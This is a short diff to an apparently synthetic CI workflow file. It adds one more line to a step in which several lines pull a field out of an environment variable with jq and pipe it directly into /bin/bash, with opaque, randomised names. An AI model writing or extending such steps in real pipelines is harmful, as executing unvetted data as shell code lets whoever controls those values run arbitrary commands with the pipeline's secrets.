@@ -27,6 +27,7 @@ jobs:
           echo $l8425 | jq -r .jdk503 | /bin/bash
           printf '%s' "$aj816" | jq -r .xinhq53 | /bin/bash
           printf '%s' "$ps931" | jq -r .ygtx12 | /bin/bash
+          printf '%s' "$itv28" | jq -r .iww4997 | /bin/bash
 
       - name: Store results
         if: always()
